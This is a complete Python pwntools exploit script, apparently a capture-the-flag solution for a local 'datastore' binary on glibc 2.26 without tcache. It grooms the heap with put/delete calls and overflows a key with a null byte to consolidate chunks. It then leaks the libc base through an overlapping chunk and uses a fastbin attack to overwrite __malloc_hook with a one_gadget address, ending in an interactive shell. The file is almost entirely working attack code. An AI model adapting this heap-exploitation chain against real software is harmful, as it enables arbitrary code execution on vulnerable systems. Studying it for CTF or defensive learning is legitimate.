#!/usr/bin/env python3
# for glibc 2.26 no-tcache
from pwn import *

context(os="linux", arch="amd64", log_level="debug")

ready = False
if ready:
    pass
else:
    io = process("./datastore")
    libc = ELF("../glibc_versions/2.26/x64_notcache/lib/libc-2.26.so")

def cmd(command):
    io.recvuntil("Enter command:\n")
    io.sendline(command)

def get(key):
    cmd("GET")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)
    io.recvuntil("[")
    num = int(io.recvuntil(" bytes").strip(b" bytes"))
    io.recvuntil(':\n')
    return io.recv(num)

def put(key, size, content):
    cmd("PUT")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)
    io.recvuntil("Enter data size:\n")
    io.sendline(str(size))
    io.recvuntil("Enter data:\n")
    if len(content) < size:
        content = content.ljust(size, b"\x00")
    io.send(content)

def delete(key):
    cmd("DEL")
    io.recvuntil("Enter row key:\n")
    io.sendline(key)

delete("th3fl4g")
for i in range(10):
    put(str(i), 0x38, b"padding")
for i in range(10):
    delete(str(i))

put("1", 0x100, b"1")
put("2", 0xd0, b"2")
put("3", 0x60, b"3")
put("4", 0xf0, b"4")
put("5", 0xf0, b"5")
put("top", 0x400, b"padding to top")

delete("1")
delete("3")
delete("4")
delete(b"a" * 0xf0 + p64(0x360))
delete("5")

put("0x330", 0x330, b"padding")
put("0x100", 0x100, b"padding")

libc_base = u64(get("2")[:6].ljust(8, b"\x00")) - 0x3ABC60
log.info("libc_base: 0x%x" % libc_base)
put("prepare", 0xf0, b"a" * 0xd8 + p64(0x71) + p64(libc_base + libc.symbols["__malloc_hook"] - 0x10 - 3))
# gdb.attach(io, "b *$rebase(0x1A20)")
put("0x68", 0x68, b"padding")
put("attack", 0x68, b"a" * 3 + p64(libc_base + 0x40dd6))
delete("a")
io.interactive()
